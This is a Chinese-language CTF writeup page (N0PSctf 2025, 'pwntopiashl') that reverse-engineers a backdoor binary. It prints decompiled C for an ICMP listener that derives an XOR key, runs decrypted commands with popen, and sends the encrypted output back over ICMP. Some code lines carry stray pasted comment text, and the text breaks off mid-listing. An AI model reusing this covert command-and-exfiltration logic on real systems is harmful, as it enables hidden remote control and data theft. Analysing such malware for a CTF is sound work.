<!DOCTYPE html>
<html lang=cn>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="N0PSctf 2025 writeuppwntopiashl题目描述N0PStopia has been attacked by PwnTopia! They installed a stealthy binary on one of our servers, but we did not understand what it does! Can you help? We saw some we">
<meta property="og:type" content="article">
<meta property="og:title" content="N0PSctf 2025 writeup">
<meta property="og:url" content="https://syscall.fun/post/n0pstf-2025-z1pfrul.html">
<meta property="og:site_name" content="scriptk1d">
<meta property="og:description" content="N0PSctf 2025 writeuppwntopiashl题目描述N0PStopia has been attacked by PwnTopia! They installed a stealthy binary on one of our servers, but we did not understand what it does! Can you help? We saw some we">
<meta property="og:locale">
<meta property="og:image" content="https://syscall.fun/assets/image-20250602194448-8yt67rm.png">
<meta property="og:image" content="https://syscall.fun/assets/image-20250602194908-uh4ri6y.png">
<meta property="og:image" content="https://syscall.fun/assets/image-20250602195714-ar92nx1.png">
<meta property="og:image" content="https://syscall.fun/assets/image-20250602200215-plgea26.png">
<meta property="og:image" content="https://syscall.fun/assets/image-20250602203715-w1wgnnw.png">
<meta property="og:image" content="https://syscall.fun/assets/image-20250602203726-c7ll4a7.png">
<meta property="og:image" content="https://syscall.fun/assets/image-20250602203739-eklexji.png">
<meta property="og:image" content="https://syscall.fun/assets/image-20250602203750-6ktsy5r.png">
<meta property="og:image" content="https://syscall.fun/assets/image-20250602203803-d3mfu1n.png">
<meta property="og:image" content="https://syscall.fun/assets/image-20250602203813-z2h1387.png">
<meta property="article:published_time" content="2025-06-02T09:51:06.000Z">
<meta property="article:modified_time" content="2025-06-03T07:29:10.000Z">
<meta property="article:author" content="scriptk1d">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://syscall.fun/assets/image-20250602194448-8yt67rm.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>N0PSctf 2025 writeup</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.1.1"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/probberechts">Projects</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/post/qemu-running-raspberry-pi-system-1iuehp.html"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://syscall.fun/post/n0pstf-2025-z1pfrul.html"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://syscall.fun/post/n0pstf-2025-z1pfrul.html&text=N0PSctf 2025 writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://syscall.fun/post/n0pstf-2025-z1pfrul.html&title=N0PSctf 2025 writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://syscall.fun/post/n0pstf-2025-z1pfrul.html&is_video=false&description=N0PSctf 2025 writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=N0PSctf 2025 writeup&body=Check out this article: https://syscall.fun/post/n0pstf-2025-z1pfrul.html"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://syscall.fun/post/n0pstf-2025-z1pfrul.html&title=N0PSctf 2025 writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://syscall.fun/post/n0pstf-2025-z1pfrul.html&title=N0PSctf 2025 writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://syscall.fun/post/n0pstf-2025-z1pfrul.html&title=N0PSctf 2025 writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://syscall.fun/post/n0pstf-2025-z1pfrul.html&title=N0PSctf 2025 writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://syscall.fun/post/n0pstf-2025-z1pfrul.html&name=N0PSctf 2025 writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://syscall.fun/post/n0pstf-2025-z1pfrul.html&t=N0PSctf 2025 writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#N0PSctf-2025-writeup"><span class="toc-number">1.</span> <span class="toc-text">N0PSctf 2025 writeup</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwntopiashl"><span class="toc-number">2.</span> <span class="toc-text">pwntopiashl</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0"><span class="toc-number">2.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90"><span class="toc-number">2.2.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pwntopiashl-1"><span class="toc-number">3.</span> <span class="toc-text">pwntopiashl</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E6%8F%8F%E8%BF%B0-1"><span class="toc-number">3.1.</span> <span class="toc-text">题目描述</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-number">3.2.</span> <span class="toc-text">分析</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Break-My-Stream"><span class="toc-number">4.</span> <span class="toc-text">Break My Stream</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#G-Bee-S"><span class="toc-number">5.</span> <span class="toc-text">G-Bee-S</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        N0PSctf 2025 writeup
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">scriptk1d</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-06-02T09:51:06.000Z" class="dt-published" itemprop="datePublished">2025-06-02</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="N0PSctf-2025-writeup"><a href="#N0PSctf-2025-writeup" class="headerlink" title="N0PSctf 2025 writeup"></a>N0PSctf 2025 writeup</h1><h1 id="pwntopiashl"><a href="#pwntopiashl" class="headerlink" title="pwntopiashl"></a>pwntopiashl</h1><h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>N0PStopia has been attacked by PwnTopia! They installed a stealthy binary on one of our servers, but we did not understand what it does! Can you help? We saw some weird ICMP traffic during the attack, you can find attached a capture file.</p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>题目给了给 elf 和 一个 pcap</p>
<p>pcap 里面包含了几组畸形的ICMP流量</p>
<p>ida 打开 pwntopiashl 文件，关键逻辑都在 <code>icmp_packet_listener</code>​ 函数中</p>
<p>在进行分析之前需要先大致看过一遍，因为IDA在反汇编这个函数的时候有几个的错误需要手动纠正，不然就没法分析</p>
<p>首先</p>
<pre><code>1. 需要注意的是这个 `memset(s, 0, 0x63C0uLL)`​ ，可以看到 s 的大小应该是 0x63C0，但是IDA把它识别成了char s[20]，这里会导致后面伪代码错误
</code></pre>
<p>‍</p>
<pre><code>![image](assets/image-20250602191118-i856y49.png)

2. 还需要注意这个存储key的变量v9，ida会把它识别成一个 __int16，但是看下面的解密过程 `dest[j] ^= *((_BYTE *)&amp;v9 + (j &amp; 7))`​ 其实可以推断出这个 v9 的长度为 8
</code></pre>
<p>‍</p>
<pre><code>![image](assets/image-20250602191343-80czbc9.png)
</code></pre>
<p>修正完这两个地方，伪代码即可看出正确的逻辑</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">icmp_packet_listener</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> i_1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">size_t</span> v1; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">size_t</span> i_2; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">int</span> i_4; <span class="comment">// eax</span></span><br><span class="line">  sockaddr addr; <span class="comment">// [rsp+0h] [rbp-C810h] BYREF</span></span><br><span class="line">  _BYTE buf[<span class="number">32</span>]; <span class="comment">// [rsp+10h] [rbp-C800h] BYREF</span></span><br><span class="line">  __int8 v6[<span class="number">8</span>]; <span class="comment">// [rsp+38h] [rbp-C7D8h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">25536</span>]; <span class="comment">// [rsp+40h] [rbp-C7D0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">25536</span>]; <span class="comment">// [rsp+6400h] [rbp-6410h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i_5; <span class="comment">// [rsp+C7C0h] [rbp-50h]</span></span><br><span class="line">  <span class="type">int</span> j_1; <span class="comment">// [rsp+C7C4h] [rbp-4Ch]</span></span><br><span class="line">  FILE *stream; <span class="comment">// [rsp+C7C8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">int</span> v12; <span class="comment">// [rsp+C7D0h] [rbp-40h]</span></span><br><span class="line">  <span class="type">int</span> n28; <span class="comment">// [rsp+C7D4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">char</span> *v14; <span class="comment">// [rsp+C7D8h] [rbp-38h]</span></span><br><span class="line">  <span class="type">char</span> *s_1; <span class="comment">// [rsp+C7E0h] [rbp-30h]</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+C7ECh] [rbp-24h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+C7F0h] [rbp-20h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+C7F4h] [rbp-1Ch]</span></span><br><span class="line">  <span class="type">int</span> v19; <span class="comment">// [rsp+C7F8h] [rbp-18h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> i_3; <span class="comment">// [rsp+C7FCh] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  fd = socket(<span class="number">2</span>, <span class="number">3</span>, <span class="number">1</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">      <span class="title function_">memset</span><span class="params">(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s))</span>;</span><br><span class="line">    <span class="keyword">while</span> ( recv(fd, s, <span class="number">0x63BF</span>uLL, <span class="number">0</span>) &lt;= <span class="number">0</span> );</span><br><span class="line">    s_1 = s;</span><br><span class="line">    v14 = &amp;s[<span class="number">20</span>];</span><br><span class="line">    n28 = <span class="number">28</span>;</span><br><span class="line">    <span class="keyword">if</span> ( s[<span class="number">20</span>] == <span class="number">0xC</span> &amp;&amp; v14[<span class="number">1</span>] == <span class="number">0x23</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(_WORD *)v6 = *((_WORD *)v14 + <span class="number">1</span>);s[<span class="number">20</span>] == <span class="number">0xC</span> 和 s[<span class="number">21</span>] == <span class="number">0x23</span> 的时候进入这个判断，进行密钥的生成</span><br><span class="line">      v6[<span class="number">2</span>] = rand();</span><br><span class="line">      v6[<span class="number">3</span>] = rand();</span><br><span class="line">      v6[<span class="number">4</span>] = v6[<span class="number">0</span>] ^ v6[<span class="number">1</span>];</span><br><span class="line">      v6[<span class="number">5</span>] = v6[<span class="number">2</span>] ^ v6[<span class="number">3</span>];</span><br><span class="line">      v6[<span class="number">6</span>] = v6[<span class="number">0</span>] ^ v6[<span class="number">2</span>];</span><br><span class="line">      v6[<span class="number">7</span>] = v6[<span class="number">1</span>] ^ v6[<span class="number">3</span>];</span><br><span class="line">      <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">      addr.sa_family = <span class="number">2</span>;</span><br><span class="line">      *(_DWORD *)&amp;addr.sa_data[<span class="number">2</span>] = *((_DWORD *)s_1 + <span class="number">3</span>);</span><br><span class="line">      buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">      *(_WORD *)&amp;buf[<span class="number">2</span>] = *(_WORD *)&amp;v6[<span class="number">2</span>];</span><br><span class="line">      sleep(<span class="number">1u</span>);</span><br><span class="line">      sendto(fd, buf, v12 + <span class="number">8LL</span>, <span class="number">0</span>, &amp;addr, <span class="number">0x10</span>u);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( *v14 == <span class="number">0x13</span> &amp;&amp; v14[<span class="number">1</span>] == <span class="number">0x2A</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      addr.sa_family = <span class="number">2</span>;</span><br><span class="line">      *(_DWORD *)&amp;addr.sa_data[<span class="number">2</span>] = *((_DWORD *)s_1 + <span class="number">3</span>);</span><br><span class="line">      <span class="built_in">memset</span>(dest, <span class="number">0</span>, <span class="keyword">sizeof</span>(dest));</span><br><span class="line">      <span class="built_in">memcpy</span>(dest, &amp;s[n28], (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">25535</span> - n28));</span><br><span class="line">      <span class="keyword">for</span> ( i = <span class="number">25536</span>; ; --i )</span><br><span class="line">      &#123;</span><br><span class="line">        i_1 = i;</span><br><span class="line">        <span class="keyword">if</span> ( i_1 &lt; <span class="built_in">strlen</span>(dest) || dest[i - <span class="number">1</span>] )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; i; ++j )</span><br><span class="line">        dest[j] ^= v6[j &amp; <span class="number">7</span>];</span><br><span class="line">      <span class="built_in">puts</span>(dest);</span><br><span class="line">      fflush(_bss_start);</span><br><span class="line">      stream = popen(dest, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> ( stream )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">memset</span>(dest, <span class="number">0</span>, <span class="keyword">sizeof</span>(dest));</span><br><span class="line">        <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="keyword">sizeof</span>(s));</span><br><span class="line">        <span class="keyword">while</span> ( fgets(s, <span class="number">25536</span>, stream) )</span><br><span class="line">        &#123;</span><br><span class="line">          v1 = <span class="built_in">strlen</span>(dest);</span><br><span class="line">          <span class="keyword">if</span> ( v1 + <span class="built_in">strlen</span>(s) &gt; <span class="number">0x63BE</span> )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="built_in">strcat</span>(dest, s);</span><br><span class="line">        &#125;</span><br><span class="line">        pclose(stream);</span><br><span class="line">        i = <span class="built_in">strlen</span>(dest);</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; i; ++j )</span><br><span class="line">          dest[j] ^= v6[j &amp; <span class="number">7</span>];</span><br><span class="line">        <span class="keyword">for</span> ( i = <span class="number">25536</span>; ; --i )</span><br><span class="line">        &#123;</span><br><span class="line">          i_2 = i;</span><br><span class="line">          <span class="keyword">if</span> ( i_2 &lt; <span class="built_in">strlen</span>(dest) || dest[i - <span class="number">1</span>] )</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        v19 = <span class="number">0</span>;</span><br><span class="line">        i_3 = i;</span><br><span class="line">        j_1 = ((<span class="type">unsigned</span> __int64)i &gt;&gt; <span class="number">4</span>) + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; j_1; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">          buf[<span class="number">0</span>] = <span class="number">8</span>;</span><br><span class="line">          i_4 = i_3;v14[<span class="number">1</span>] == <span class="number">0x23</span></span><br><span class="line">          <span class="keyword">if</span> ( i_3 &gt; <span class="number">0x10</span> )</span><br><span class="line">            i_4 = <span class="number">16</span>;</span><br><span class="line">          i_5 = i_4;</span><br><span class="line">          <span class="built_in">sprintf</span>(&amp;buf[<span class="number">8</span>], <span class="string">&quot;%04d%04d&quot;</span>, j + <span class="number">1</span>, j_1);</span><br><span class="line">          <span class="built_in">memcpy</span>(&amp;buf[<span class="number">16</span>], &amp;dest[v19], i_5);</span><br><span class="line">          v19 += i_5;</span><br><span class="line">          i_3 -= i_5;</span><br><span class="line">          sleep(<span class="number">1u</span>);</span><br><span class="line">          sendto(fd, buf, i_5 + <span class="number">16LL</span>, <span class="number">0</span>, &amp;addr, <span class="number">0x10</span>u);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序大致做了几个关键的事情：</p>
<ol>
<li><p>首先创建了一个接受 ICMP 包的 socket，这里 <code>socket(2, 3, 1)</code>​ 对应的源码应该是 <code>socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)</code>​ ，这些宏定义的值可以在 <code>/usr/include/bits/socket_type.h</code>​ 和 <code>/usr/include/bits/socket.h</code>​中找到，或者一些插件也可以还原出来。</p>
</li>
<li><p>​<code>while ( recv(fd, s, 0x63BFuLL, 0) &lt;= 0 );</code>​ 循环接收 ICMP 包</p>
</li>
<li><p>生成密钥</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">v14 = &amp;s[<span class="number">20</span>];    </span><br><span class="line"><span class="comment">//分析可以得出 s[20] == 0xC 和 s[21] == 0x23 的时候进入这个判断，进行密钥的生成</span></span><br><span class="line"><span class="keyword">if</span> ( s[<span class="number">20</span>] == <span class="number">0xC</span> &amp;&amp; v14[<span class="number">1</span>] == <span class="number">0x23</span> )</span><br><span class="line">   &#123;</span><br><span class="line">	<span class="comment">// 取出 v14 + 1 处的一个 _WORD 赋值给 v6 这个地址，其实就是接收的包的 s[22]、s[23]</span></span><br><span class="line">     *(_WORD *)v6 = *((_WORD *)v14 + <span class="number">1</span>);</span><br><span class="line">	<span class="comment">// 生成两个随机数赋值给 v6[2] 和 v6[3]</span></span><br><span class="line">     v6[<span class="number">2</span>] = rand();</span><br><span class="line">     v6[<span class="number">3</span>] = rand();</span><br><span class="line">	<span class="comment">// 密钥的后面 4 个是由 前面4个字节变换出来的</span></span><br><span class="line">     v6[<span class="number">4</span>] = v6[<span class="number">0</span>] ^ v6[<span class="number">1</span>];</span><br><span class="line">     v6[<span class="number">5</span>] = v6[<span class="number">2</span>] ^ v6[<span class="number">3</span>];</span><br><span class="line">     v6[<span class="number">6</span>] = v6[<span class="number">0</span>] ^ v6[<span class="number">2</span>];</span><br><span class="line">     v6[<span class="number">7</span>] = v6[<span class="number">1</span>] ^ v6[<span class="number">3</span>];</span><br><span class="line">	<span class="comment">// 到这里密钥就由 ICMP 携带的两个字节以及生成的两个随机数以及他们变换出来的 4 个直接共同组成密钥，存储在了 v6</span></span><br><span class="line">     <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">     addr.sa_family = <span class="number">2</span>;</span><br><span class="line">     *(_DWORD *)&amp;addr.sa_data[<span class="number">2</span>] = *((_DWORD *)s_1 + <span class="number">3</span>);</span><br><span class="line">     buf[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">	<span class="comment">// 这里只把随机生成的两个字节（一个WORD）最为回包发送出去</span></span><br><span class="line">     *(_WORD *)&amp;buf[<span class="number">2</span>] = *(_WORD *)&amp;v6[<span class="number">2</span>];</span><br><span class="line">     sleep(<span class="number">1u</span>);</span><br><span class="line">     sendto(fd, buf, v12 + <span class="number">8LL</span>, <span class="number">0</span>, &amp;addr, <span class="number">0x10</span>u);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>执行命令</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">   n28 = <span class="number">28</span>;</span><br><span class="line">......</span><br><span class="line"><span class="comment">// 当 s[20] == 0x13 和 s[21] == 0x2A 的时候进入这个判断，执行命令</span></span><br><span class="line"><span class="keyword">if</span> ( *v14 == <span class="number">0x13</span> &amp;&amp; v14[<span class="number">1</span>] == <span class="number">0x2A</span> )</span><br><span class="line">   &#123;</span><br><span class="line">     addr.sa_family = <span class="number">2</span>;</span><br><span class="line">     *(_DWORD *)&amp;addr.sa_data[<span class="number">2</span>] = *((_DWORD *)s_1 + <span class="number">3</span>);</span><br><span class="line">     <span class="built_in">memset</span>(dest, <span class="number">0</span>, <span class="keyword">sizeof</span>(dest));</span><br><span class="line">     <span class="built_in">memcpy</span>(dest, &amp;s[n28], (<span class="type">unsigned</span> <span class="type">int</span>)(<span class="number">25535</span> - n28));</span><br><span class="line">     <span class="keyword">for</span> ( i = <span class="number">25536</span>; ; --i )</span><br><span class="line">     &#123;</span><br><span class="line">       i_1 = i;</span><br><span class="line">       <span class="keyword">if</span> ( i_1 &lt; <span class="built_in">strlen</span>(dest) || dest[i - <span class="number">1</span>] )</span><br><span class="line">         <span class="keyword">break</span>;</span><br><span class="line">     &#125;</span><br><span class="line"><span class="comment">// 需要关注的是这里，会把传入的数据和 v6 也就是上个步骤生成 key 进行循环异或</span></span><br><span class="line">     <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; i; ++j )</span><br><span class="line">       dest[j] ^= v6[j &amp; <span class="number">7</span>];</span><br><span class="line">     <span class="built_in">puts</span>(dest);</span><br><span class="line">     fflush(_bss_start);</span><br><span class="line"><span class="comment">// 传入 popen 执行 </span></span><br><span class="line">     stream = popen(dest, <span class="string">&quot;r&quot;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>返回执行结果</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">    <span class="comment">// 执行传进来的命令</span></span><br><span class="line"> stream = popen(dest, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> ( stream )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">memset</span>(dest, <span class="number">0</span>, <span class="keyword">sizeof</span>(dest));</span><br><span class="line">      <span 